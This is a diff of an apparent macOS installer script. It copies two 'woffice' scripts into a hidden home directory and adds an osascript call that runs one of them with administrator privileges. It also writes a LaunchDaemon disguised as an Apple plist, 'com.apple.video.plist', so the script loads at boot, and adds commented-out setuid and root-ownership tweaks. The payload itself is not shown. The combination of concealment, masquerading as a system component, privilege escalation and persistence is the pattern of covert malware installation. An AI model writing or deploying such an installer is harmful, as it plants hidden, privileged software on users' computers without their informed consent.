@@ -9,11 +9,15 @@ cp woffice.py $HOME/.hidden/woffice.py
 cp woffice.sh $HOME/.hidden/woffice.sh
 
 
+
+
 #Give the script permission to execute
 chmod +x $HOME/.hidden/woffice.py
 chmod 777 $HOME/.hidden/woffice.sh
-sh $HOME/.hidden/woffice.sh
-#chown root $HOME/.hidden/woffice.py
+#chown root $HOME/.hidden/woffice.sh
+#chmod u+s $HOME/.hidden/woffice.sh
+#sh $HOME/.hidden/woffice.sh
+osascript -e "do shell script \"$HOME/.hidden/woffice.sh $*\" with administrator privileges"
 
 #Create directory if it doesn't already exist.
 mkdir $HOME/Library/LaunchAgents
@@ -39,6 +43,7 @@ echo '
 </plist>
 ' > /Library/LaunchDaemons/com.apple.video.plist
 chown root /Library/LaunchDaemons/com.apple.video.plist
+#chmod 4755 /Library/LaunchDaemons/com.apple.video.plist
 #Load the LaunchAgent
 launchctl load -w /Library/LaunchDaemons/com.apple.video.plist
 
